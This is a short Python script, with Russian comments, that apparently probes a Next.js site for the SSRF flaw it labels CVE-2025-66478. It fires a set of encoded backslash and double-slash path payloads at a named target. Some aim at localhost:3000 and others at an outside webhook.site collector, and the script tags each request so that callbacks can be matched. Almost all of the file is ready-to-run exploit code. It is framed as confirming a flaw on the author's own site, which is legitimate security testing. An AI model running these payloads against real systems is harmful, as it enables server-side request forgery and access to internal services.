#!/usr/bin/env python3
# next15_cve66478_confirm.py
import requests, json, time, uuid

# ====== НАСТРОЙКИ ======
TARGET = "https://demo.djangocfg.com"     # твой сайт
PROVE_URL = "https://en8q-xxxxxx.webhook.site/unique-id"  # webhook или твой /ssrf-test-receiver
TIME_BETWEEN = 0.5   # seconds between requests
# ========================

payloads = {
    "backslash_localhost_1": "/%5C%5Clocalhost:3000",                 # ранее сработал
    "double_slash_localhost_1": "//http://localhost:3000",            # ранее сработал
    "proto_inject_to_prove_1": "/%5C" + PROVE_URL,                    # \https://... 
    "proto_inject_to_prove_2": "/%5C%5C" + PROVE_URL,                 # \\https://...
    "api_fetch_probe_1": "/api/fetch/%5C" + PROVE_URL,                # если есть /api/fetch handler
    "wellknown_probe": "/.well-known/%5C" + PROVE_URL,
    "next_probe": "/_next/%5C" + PROVE_URL,
    "double_slash_probe": "//" + PROVE_URL,
    "rare_chain_probe": "/%5C/%5C/" + PROVE_URL,
}

headers = {"User-Agent": "CVE-2025-66478-ConfirmTester/1.0"}

def send(path):
    url = TARGET + path
    try:
        r = requests.get(url, timeout=8, allow_redirects=False, headers=headers)
        return {"status": r.status_code, "location": r.headers.get("location"), "snippet": r.text[:300].replace("\n"," ")}
    except Exception as e:
        return {"error": str(e)}

def main():
    print("→ Confirm SSRF: target:", TARGET)
    print("→ Prove URL:", PROVE_URL)
    results = {}
    unique = str(uuid.uuid4())[:8]
    print("→ Unique tag for this run:", unique)
    print("Send payloads -> then check incoming requests at your PROVE_URL (or server logs).")
    print("-" * 60)

    # send each payload with unique query param to correlate
    for name, path in payloads.items():
        # attach unique query param so incoming request contains it
        suffix = ("?tag=" + unique + "&p=" + name)
        full_path = path + suffix
        print("▶", name, "->", full_path)
        res = send(full_path)
        results[name] = res
        print(json.dumps(res, indent=2))
        time.sleep(TIME_BETWEEN)

    print("\nDONE. Now check PROVE_URL logs for incoming hits containing tag=", unique)
    print("Results summary:")
    for k,v in results.items():
        print(f"{k:25} -> {v.get('status') if isinstance(v, dict) else v}")

if __name__ == "__main__":
    main()
